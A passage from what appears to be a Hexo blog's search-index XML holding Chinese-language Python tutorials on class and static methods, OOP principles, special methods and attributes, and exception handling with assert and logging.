class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>，<span class="subst">&#123;self.gender&#125;</span>，<span class="subst">&#123;self.age&#125;</span>，初始战斗力<span class="subst">&#123;self.volume&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = Game(<span class="string">&#x27;小红&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">18</span>, <span class="number">1000</span>)</span><br><span class="line">g2 = Game(<span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">20</span>, <span class="number">1800</span>)</span><br><span class="line">g3 = Game(<span class="string">&#x27;小紫&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">19</span>, <span class="number">2500</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">返回：</span></span><br><span class="line"><span class="string">小红，女，18，初始战斗力1000</span></span><br><span class="line"><span class="string">小明，男，20，初始战斗力1800</span></span><br><span class="line"><span class="string">小紫，女，19，初始战斗力2500</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(g1)</span><br><span class="line"><span class="built_in">print</span>(g2)</span><br><span class="line"><span class="built_in">print</span>(g3)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">返回：</span></span><br><span class="line"><span class="string">草丛战斗，消耗200战斗力，还剩下800战斗力</span></span><br><span class="line"><span class="string">自我修炼，增长100战斗力，还剩下1900战斗力</span></span><br><span class="line"><span class="string">多人游戏，消耗500战斗力，还剩下2000战斗力</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">g1.grass_battle()</span><br><span class="line">g2.practice()</span><br><span class="line">g3.mary_battle()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>类方法和静态方法</title>
    <url>/post/27cd422a.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——面向对象中的类方法和静态方法</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、类属性和对象属性"><a href="#一、类属性和对象属性" class="headerlink" title="一、类属性和对象属性"></a>一、类属性和对象属性</h4><p>从字面上其实也可以理解，类属性是在类中定义的属性，属于类，对象属性是创建实例初始化的属性，属于对象实例。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    name=<span class="string">&quot;z7sz&quot;</span>  <span class="comment">#类属性</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.name=name  <span class="comment">#对象属性</span></span><br><span class="line">        </span><br><span class="line">s1=Student(<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1.name)  <span class="comment">#结果为blog，访问的是对象属性</span></span><br><span class="line"><span class="built_in">print</span>(Student.name)   <span class="comment">#结果为z7sz，访问的是类属性</span></span><br></pre></td></tr></table></figure>

<p>访问类属性通过<code>类名.属性名</code>来访问。类属性和对象属性还是很容易理解的，这两种的访问方式也不同，在某些特殊时候，类属性可以通过对象来访问，比如该对象中没有该属性时，访问<code>对象名.属性名</code>则可以访问到类属性，但是最好不要这么做，因为这么做容易导致类属性和对象属性两者混乱。</p>
<h4 id="二、类方法和静态方法"><a href="#二、类方法和静态方法" class="headerlink" title="二、类方法和静态方法"></a>二、类方法和静态方法</h4><p>之前我们在类中定义的方法都是属于对象方法，换句话说就是这些方法都是跟对象相关的方法，是对象使用的到的方法。除此之外，类中还可以存在类方法和静态方法，这两类方法是属于类的，也就是说这两种方法不是对象该有的方法。</p>
<p>类方法用@classmethod装饰器修饰，并且第一个参数是cls，代表类本身；一般使用<code>类名.方法名</code>调用，不建议使用<code>对象名.方法名</code>调用；没有self，不可以使用类中其他对象的属性和方法；可以调用类方法、类属性和静态方法，通过cls调用。</p>
<p>静态方法通过@staticmethod 装饰器修饰；静态方法的写法跟写普通函数一样；一般使用<code>类名.方法名</code>调用，不建议使用<code>对象名.方法名</code>调用；既没有self也没有cls，因此不可以使用类中其他对象的属性和方法；形式参数中没有cls，不建议使用类属性\类方法\静态方法；静态方法是一个单独的方法，我们在定义类的时候，有时候部分函数跟类没关系，但是我们又需要用到它，我们可以在类外面单独定义这个函数，但是这样子的话会使代码变得难理解，因此使用静态方法，把这个单独的函数搬到类中表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">type</span>(self.name))</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">if_str</span>(<span class="params">cls,name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name,<span class="built_in">str</span>):</span><br><span class="line">            name=<span class="built_in">str</span>(name) </span><br><span class="line">        <span class="keyword">return</span> cls(name)  <span class="comment">#处理完后返回类的实例对象</span></span><br><span class="line">        </span><br><span class="line">s1=Student(<span class="string">&#x27;z7sz&#x27;</span>)</span><br><span class="line">s2=Student.if_str(<span class="number">111</span>)  <span class="comment">#显示为str类型</span></span><br></pre></td></tr></table></figure>

<p>像上面的代码，写了一个函数用来判断传入的参数值是否为字符串，这个函数跟s1这个对象是没有啥关系的，实际上也可以在类外部定义函数并进行判断。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student_s</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        Student.if_str(self.name)</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">if_str</span>(<span class="params">name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name,<span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;name must be an str!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s3=Student_s(<span class="string">&#x27;zsz&#x27;</span>)</span><br><span class="line">s4=Student_s(<span class="number">111</span>) <span class="comment">#会显示错误</span></span><br></pre></td></tr></table></figure>

<p>静态方法和类方法二者并没有本质区别，静态方法通常是一个独立的函数，并没有和特定的对象绑定。</p>
<p>由于Python类中只能有一个初始化方法，不能按照不同的情况初始化类，所以类方法可以用来自定义初始化，比如上面的类方法样例，当然静态方法也可以，但是静态方法由于没有形参，所以每次都要写上类的名字，类名一改静态方法就会发生错误，所以静态方法更适合于用来定义跟类没有任何关系的函数，而类方法则可以用来自定义初始化。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象三大特性</title>
    <url>/post/42b426aa.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——面向对象三大特性</p>
</blockquote>
<hr>
<span id="more"></span>

<p>面向对象编程有三大特性，分别为<strong>封装</strong>、<strong>继承</strong>和<strong>多态</strong>。这篇博客主要是讲这三大特性。</p>
<h5 id="1、封装"><a href="#1、封装" class="headerlink" title="1、封装"></a>1、封装</h5><p>封装很容易理解，就是把类中的方法隐藏起来，我们不需要关注类中的方法是怎么写的，我们只需要知道怎么去调用类的方法就可以了。像现在网站有很多的这种API接口，我们用这些api接口可以很方便的实现我们想要的功能，比如查询天气等等，但是这种api接口内部的代码是怎样的，我们肯定是不知道的，我们只知道API的名字以及所需要的参数，这种就是封装。</p>
<p>python把面向对象发挥到了极致，一切皆对象并不是说说而已，前面所说的数据类型——字符串、列表等等，实际上也是对象，这些对象并不需要我们去自定义类，python已经黑我们内置好了。</p>
<h5 id="2、继承"><a href="#2、继承" class="headerlink" title="2、继承"></a>2、继承</h5><p>面向对象的编程语言支持在已有类的基础上创建新类，从而减少重复代码的编写。提供继承信息的类叫做父类（超类、基类），得到继承信息的类叫做子类（派生类、衍生类），这就是继承，继承指的是事物之间的所属关系，在python中，每一个类默认都会继承object这个父类。继承只能继承公有的不能继承私有的属性或方法。</p>
<p>举个例子，我们定义狗和猫两个类，我们会发现这两个类有些行为是一样的，而这些一样的行为都是作为狗和猫的公共属性或行为，这个时候，我们可以先定义动物这个类，然后再定义狗和猫，并且继承动物类，这些公共属性或行为是属于动物这个类的。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(<span class="title class_ inherited__">object</span>):  </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;父类&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.name=name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>在吃饭&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>在睡觉&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):  <span class="comment">#继承Animal类</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;子类&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,color</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)  <span class="comment"># 调用父类的初始化方法</span></span><br><span class="line">        self.color=color</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">shout</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>在大叫&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;子类&#x27;&#x27;&#x27;</span>   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">catch</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;抓&quot;</span>)</span><br><span class="line"></span><br><span class="line">dog1=Dog(<span class="string">&#x27;dog1&#x27;</span>,<span class="string">&#x27;白色&#x27;</span>)</span><br><span class="line">dog1.eat()  <span class="comment"># 使用父类的公共方法</span></span><br><span class="line">cat1=Cat(<span class="string">&#x27;cat1&#x27;</span>)</span><br><span class="line">cat1.sleep()</span><br></pre></td></tr></table></figure>

<p>继承的语法是在定义类的时候，在类名后的圆括号中指定当前类的父类。如果定义一个类的时候没有指定它的父类是谁，那么默认的父类是<code>object</code>类。<code>object</code>类是Python中的顶级类，这也就意味着所有的类都是它的子类，要么直接继承它，要么间接继承它。Python语言允许多重继承，也就是说一个类可以有一个或多个父类。在子类的初始化方法中，我们可以通过<code>super().__init__()</code>来调用父类初始化方法。子类继承父类的方法后，还可以对方法进行重写（重新实现该方法），不同的子类可以对父类的同一个方法给出不同的实现版本。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;hello,我是<span class="subst">&#123;self.name&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">self</span>): <span class="comment">#重写父类的方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;hello,我是高一学生<span class="subst">&#123;self.name&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s1=Student(<span class="string">&#x27;小红&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">s1.say_hello()</span><br></pre></td></tr></table></figure>

<h5 id="3、多态"><a href="#3、多态" class="headerlink" title="3、多态"></a>3、多态</h5><p>多态是指同一个方法调用由于对象不同可能会产生不同的行为。重写父类的方法会表现出多态行为，调用相同的方法，做了不同的事情。所以多态的存在有2个必要条件：继承、方法重写。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊方法和特殊属性</title>
    <url>/post/823ecc4a.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——特殊方法和特殊属性</p>
</blockquote>
<hr>
<span id="more"></span>

<p>前面讲面向对象的时候有提过几个特殊方法，比如<code>__init__</code>等，这篇博客我们来总结一些可能用的到的特殊方法和特殊属性。</p>
<h6 id="1、特殊方法"><a href="#1、特殊方法" class="headerlink" title="1、特殊方法"></a>1、特殊方法</h6><p><strong>表1-1：跟运算符无关的特殊方法</strong></p>
<table>
<thead>
<tr>
<th>类别</th>
<th align="left">方法名</th>
</tr>
</thead>
<tbody><tr>
<td>字符串 &#x2F; 字节序列表示形式</td>
<td align="left"><code>__repr__、__str__、__format__、__bytes__</code></td>
</tr>
<tr>
<td>数值转换</td>
<td align="left"><code>__abs__、__bool__、__complex__、__int__、__float__、__hash__、__index__</code></td>
</tr>
<tr>
<td>集合模拟</td>
<td align="left"><code>__len__、__getitem__、__setitem__、__delitem__、__contains__</code></td>
</tr>
<tr>
<td>迭代枚举</td>
<td align="left"><code>__iter__、__reversed__、__next__</code></td>
</tr>
<tr>
<td>可调用模拟</td>
<td align="left"><code>__call__</code></td>
</tr>
<tr>
<td>上下文管理</td>
<td align="left"><code>__enter__、__exit__</code></td>
</tr>
<tr>
<td>实例创建和销毁</td>
<td align="left"><code>__new__、__init__、__del__</code></td>
</tr>
<tr>
<td>属性管理</td>
<td align="left"><code>__getattr__、__getattribute__、__setattr__、__delattr__、__dir__</code></td>
</tr>
<tr>
<td>属性描述符</td>
<td align="left"><code>__get__、__set__、__delete__</code></td>
</tr>
<tr>
<td>跟类相关的服 务</td>
<td align="left"><code>__prepare__、__instancecheck__、__subclasscheck__</code></td>
</tr>
</tbody></table>
<p><strong>表1-2：跟运算符相关的特殊方法</strong></p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">正向方法</th>
<th align="center">反向方法</th>
<th align="center">就地方法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center"><code>__add__</code></td>
<td align="center"><code>__radd__</code></td>
<td align="center"><code>__iadd__</code></td>
<td align="center">加法或拼接</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center"><code>__sub__</code></td>
<td align="center"><code>__rsub__</code></td>
<td align="center"><code>__isub__</code></td>
<td align="center">减法</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center"><code>__mul__</code></td>
<td align="center"><code>__rmul__</code></td>
<td align="center"><code>__imul__</code></td>
<td align="center">乘法或重新复制</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center"><code>__truediv__</code></td>
<td align="center"><code>__rtruediv__</code></td>
<td align="center"><code>__itruediv__</code></td>
<td align="center">除法</td>
</tr>
<tr>
<td align="center">&#x2F;&#x2F;</td>
<td align="center"><code>__floordiv__</code></td>
<td align="center"><code>__rfloordiv__</code></td>
<td align="center"><code>__ifloordiv__</code></td>
<td align="center">整除</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center"><code>__mod__</code></td>
<td align="center"><code>__rmod__</code></td>
<td align="center"><code>__imod__</code></td>
<td align="center">取模</td>
</tr>
<tr>
<td align="center">divmod()</td>
<td align="center"><code>__divmod__</code></td>
<td align="center"><code>__rdivmod__</code></td>
<td align="center"><code>__idivmod__</code></td>
<td align="center">返回由整除的商和模数组成的元组</td>
</tr>
<tr>
<td align="center">**或者pow()</td>
<td align="center"><code>__pow__</code></td>
<td align="center"><code>__rpow__</code></td>
<td align="center"><code>__ipow__</code></td>
<td align="center">取幂</td>
</tr>
<tr>
<td align="center">@</td>
<td align="center"><code>__matmul__</code></td>
<td align="center"><code>__rmatmul__</code></td>
<td align="center"><code>__imatmul__</code></td>
<td align="center">矩阵乘法</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center"><code>__and__</code></td>
<td align="center"><code>__rand__</code></td>
<td align="center"><code>__iand__</code></td>
<td align="center">位与</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center"><code>__or__</code></td>
<td align="center"><code>__ror__</code></td>
<td align="center"><code>__ior__</code></td>
<td align="center">位或</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center"><code>__xor__</code></td>
<td align="center"><code>__rxor__</code></td>
<td align="center"><code>__ixor__</code></td>
<td align="center">位异或</td>
</tr>
<tr>
<td align="center">&lt;&lt;</td>
<td align="center"><code>__lshift__</code></td>
<td align="center"><code>__rlshift__</code></td>
<td align="center"><code>__ilshift__</code></td>
<td align="center">按位左移</td>
</tr>
<tr>
<td align="center">&gt;&gt;</td>
<td align="center"><code>__rshift__</code></td>
<td align="center"><code>__rrshift__</code></td>
<td align="center"><code>__irshift__</code></td>
<td align="center">按位右移</td>
</tr>
</tbody></table>
<p>就地运算符用于增量赋值</p>
<table>
<thead>
<tr>
<th>类别</th>
<th>方法名和对应的运算符</th>
</tr>
</thead>
<tbody><tr>
<td>一元运算符</td>
<td><code>__neg__ -、__pos__ +、__abs__ abs()</code></td>
</tr>
<tr>
<td>众多比较运算符</td>
<td><code>__lt__ &lt;、__le__ &lt;=、__eq__ ==、__ne__ !=、__gt__ &gt;、__ge__ &gt;=</code></td>
</tr>
</tbody></table>
<h6 id="2、特殊属性"><a href="#2、特殊属性" class="headerlink" title="2、特殊属性"></a>2、特殊属性</h6><table>
<thead>
<tr>
<th>特殊方法</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>obj.__dict</code>__</td>
<td>对象的属性字典</td>
</tr>
<tr>
<td><code>obj.__class__</code></td>
<td>对象所属的类</td>
</tr>
<tr>
<td><code>class.__bases__</code></td>
<td>类的基类元组（多继承）</td>
</tr>
<tr>
<td><code>class.__base__</code></td>
<td>类的基类</td>
</tr>
<tr>
<td><code>class.__mro__</code></td>
<td>类层次结构</td>
</tr>
<tr>
<td><code>class.__subclasses__()</code></td>
<td>子类列表</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>异常处理和调试</title>
    <url>/post/28877bf.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——异常处理和调试</p>
</blockquote>
<hr>
<span id="more"></span>

<h6 id="1、异常捕获"><a href="#1、异常捕获" class="headerlink" title="1、异常捕获"></a>1、异常捕获</h6><p>编程语言在程序运行的时候，难免会发生错误，特别是程序在调试的时候，如果程序在运行过程中发生错误，将会导致程序崩溃退出，但是很多时候我们并不希望程序退出，我们可能只是希望程序给我返回一个错误信息，然后程序能够继续运行，这时，我们就可以使用python的异常处理机制。Python中和异常相关的关键字有五个，分别是<code>try</code>、<code>except</code>、<code>else</code>、<code>finally</code>和<code>raise</code>。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">except</span> NameError: </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;出现名字的异常了&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没有异常时执行的代码&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结束&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在python中，将需要检测的语句放在try代码块中，try后可以跟多个except代码块来捕获不同的异常并进行处理，else代码块是检测的代码不发生异常时执行的语句，不管是否发生异常finally都会执行。上面的代码由于a没有定义，产生了NameError异常，我们在except捕获这个异常并且执行相关语句。</p>
<h6 id="2、内置异常类型"><a href="#2、内置异常类型" class="headerlink" title="2、内置异常类型"></a>2、内置异常类型</h6><p>python内置了大量的异常类型，下面列一下部分异常</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">BaseException</span><br><span class="line"> +-- SystemExit</span><br><span class="line"> +-- KeyboardInterrupt</span><br><span class="line"> +-- GeneratorExit</span><br><span class="line"> +-- Exception</span><br><span class="line">      +-- StopIteration</span><br><span class="line">      +-- StopAsyncIteration</span><br><span class="line">      +-- ArithmeticError</span><br><span class="line">      |    +-- FloatingPointError</span><br><span class="line">      |    +-- OverflowError</span><br><span class="line">      |    +-- ZeroDivisionError</span><br><span class="line">      +-- AssertionError</span><br><span class="line">      +-- AttributeError</span><br><span class="line">      +-- BufferError</span><br><span class="line">      +-- EOFError</span><br><span class="line">      +-- ImportError</span><br><span class="line">      |    +-- ModuleNotFoundError</span><br><span class="line">      +-- LookupError</span><br><span class="line">      |    +-- IndexError</span><br><span class="line">      |    +-- KeyError</span><br><span class="line">      +-- MemoryError</span><br><span class="line">      +-- NameError</span><br><span class="line">      |    +-- UnboundLocalError</span><br><span class="line">      +-- OSError</span><br><span class="line">      |    +-- BlockingIOError</span><br><span class="line">      |    +-- ChildProcessError</span><br><span class="line">      |    +-- ConnectionError</span><br><span class="line">      |    |    +-- BrokenPipeError</span><br><span class="line">      |    |    +-- ConnectionAbortedError</span><br><span class="line">      |    |    +-- ConnectionRefusedError</span><br><span class="line">      |    |    +-- ConnectionResetError</span><br><span class="line">      |    +-- FileExistsError</span><br><span class="line">      |    +-- FileNotFoundError</span><br><span class="line">      |    +-- InterruptedError</span><br><span class="line">      |    +-- IsADirectoryError</span><br><span class="line">      |    +-- NotADirectoryError</span><br><span class="line">      |    +-- PermissionError</span><br><span class="line">      |    +-- ProcessLookupError</span><br><span class="line">      |    +-- TimeoutError</span><br><span class="line">      +-- ReferenceError</span><br><span class="line">      +-- RuntimeError</span><br><span class="line">      |    +-- NotImplementedError</span><br><span class="line">      |    +-- RecursionError</span><br><span class="line">      +-- SyntaxError</span><br><span class="line">      |    +-- IndentationError</span><br><span class="line">      |         +-- TabError</span><br><span class="line">      +-- SystemError</span><br><span class="line">      +-- TypeError</span><br><span class="line">      +-- ValueError</span><br><span class="line">      |    +-- UnicodeError</span><br><span class="line">      |         +-- UnicodeDecodeError</span><br><span class="line">      |         +-- UnicodeEncodeError</span><br><span class="line">      |         +-- UnicodeTranslateError</span><br><span class="line">      +-- Warning</span><br><span class="line">           +-- DeprecationWarning</span><br><span class="line">           +-- PendingDeprecationWarning</span><br><span class="line">           +-- RuntimeWarning</span><br><span class="line">           +-- SyntaxWarning</span><br><span class="line">           +-- UserWarning</span><br><span class="line">           +-- FutureWarning</span><br><span class="line">           +-- ImportWarning</span><br><span class="line">           +-- UnicodeWarning</span><br><span class="line">           +-- BytesWarning</span><br><span class="line">           +-- ResourceWarning</span><br></pre></td></tr></table></figure>

<p>Python所有的异常都是BaseException的子类型，子类型中最常用的是Exception类型，他是常规异常类型的父类型，也就是说，我们程序运行碰到的大部分异常都是它的子类型。</p>
<h6 id="3、自定义异常"><a href="#3、自定义异常" class="headerlink" title="3、自定义异常"></a>3、自定义异常</h6><p>当内置的异常类型不满足程序要求时，我们也可以自定义异常来满足我们的要求，自定义异常需要用到raise关键字，并且自定义异常也应该继承于Exception或其子类型。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PwLen</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;自定义异常类型&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">if</span> number&lt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">raise</span> PwLen(<span class="string">&#x27;number不能小于10&#x27;</span>)  <span class="comment">#触发异常</span></span><br><span class="line">    <span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    t=test(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">except</span> PwLen <span class="keyword">as</span> p:</span><br><span class="line">    <span class="built_in">print</span>(p)  <span class="comment">#打印异常</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>上面的例子是简单的自定义异常，我们还可以在自定义异常类中做更多的操作以满足不同的异常。</p>
<h6 id="4、调试"><a href="#4、调试" class="headerlink" title="4、调试"></a>4、调试</h6><p>程序编写过程中，经常需要进行调试，已保证能得到我们想要的结果，出现bug时，有的bug很简单，看看错误信息就知道，有的bug很复杂，我们需要知道出错时，哪些变量的值是正确的，哪些变量的值是错误的，因此我们需要有调试的手段来修复bug。</p>
<p>第一种调试的方法很简单也很粗暴，就是直接用print把可能出现的错误的值打印出来看看是不是正常，很多人都是直接用这种方法，包括我也是，在写脚本时经常用到print来打印变量，但是这种调试方法不好的地方就是一旦写print的地方太多的话，很混乱，并且不能一眼就看出bug所在，需要我们做判断。</p>
<p>第二种方法就是使用断言(assert)，凡是用print来辅助查看的地方，都可以用断言（assert）来替代。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">assert</span> n!=<span class="number">0</span>,<span class="string">&#x27;n不能为0&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">N(<span class="number">0</span>) <span class="comment">#这里会直接导致程序崩溃，并打印出“n不能为0”</span></span><br></pre></td></tr></table></figure>

<p>assert判断某个表达式的值时，如果结果为True，则程序继续执行，如果结果为False，则报AssertionError错误。在编写程序的时候，养成习惯，尽量使用断言去调试，而不是选择print。在运行程序时，可以加-O选项来忽略assert语句。</p>
<p>第三种方法是通过logging模块来进行调试，和assert相比，这种方法不会抛出错误，而是输入到文件。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取当前文件路径,__file__表示当前文件的绝对路径</span></span><br><span class="line">current_work_dir = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改日志输出的格式</span></span><br><span class="line">LOG_FORMAT = <span class="string">&quot;%(asctime)s - %(levelname)s - %(message)s&quot;</span></span><br><span class="line"><span class="comment">#设置日志时间格式</span></span><br><span class="line">DATE_FORMAT = <span class="string">&quot;%m/%d/%Y %H:%M:%S %p&quot;</span></span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.DEBUG,filename=<span class="string">f&#x27;<span class="subst">&#123;current_work_dir&#125;</span>\log.txt&#x27;</span>,<span class="built_in">format</span>=LOG_FORMAT,datefmt=DATE_FORMAT)</span><br><span class="line"></span><br><span class="line">logging.log(logging.DEBUG, <span class="string">&quot;This is a debug log.&quot;</span>)</span><br><span class="line">logging.log(logging.INFO, <span class="string">&quot;This is a info log.&quot;</span>)</span><br><span class="line">logging.log(logging.WARNING, <span class="string">&quot;This is a warning log.&quot;</span>)</span><br><span class="line">logging.log(logging.ERROR, <span class="string">&quot;This is a error log.&quot;</span>)</span><br><span class="line">logging.log(logging.CRITICAL, <span class="string">&quot;This is a critical log.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">04/22/2022 10:33:25 AM - DEBUG - This is a debug log.</span></span><br><span class="line"><span class="string">04/22/2022 10:33:25 AM - INFO - This is a info log.</span></span><br><span class="line"><span class="string">04/22/2022 10:33:25 AM - WARNING - This is a warning log.</span></span><br><span class="line"><span class="string">04/22/2022 10:33:25 AM - ERROR - This is a error log.</span></span><br><span class="line"><span class="string">04/22/2022 10:33:25 AM - CRITICAL - This is a critical log.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>logging有5中日志级别，默认是WARNING级别，因此logging.basicConfig不指定级别的情况下，DEBUG和INFO级别的信息是不输出的，如果想要输出所有级别的日志，需要将level设置为DEBUG。在编写复杂的程序时，日志信息是不可缺少的。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象练习</title>
    <url>/post/d2034b13.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——面向对象练习</p>
</blockquote>
<hr>
<span id="more"></span>

